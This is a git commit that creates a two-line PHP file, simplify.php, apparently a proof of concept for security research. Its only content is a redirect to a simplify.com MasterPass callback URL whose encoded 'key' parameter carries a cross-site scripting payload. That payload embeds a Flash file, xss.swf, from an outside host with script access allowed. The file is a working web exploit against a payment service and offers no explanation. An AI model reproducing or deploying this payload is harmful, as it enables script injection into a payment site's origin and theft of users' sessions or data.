1c7872bdb6fe6205155542927b14d8b064a034b8
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-23 22:04:24 +0100

    Create simplify.php

---
+++ simplify.php
@@ -0,0 +1,2 @@
+<?php header('location: https://www.simplify.com/commerce/masterPass/callbackHandler?source=&key=%3C?PXML%3E%3Chtml:embed%20allowscriptaccess=always%20src=https:%26%23x2f%3b%26%23x2f%3bl0.cm%26%23x2f%3bxss.swf%3E
+')?>
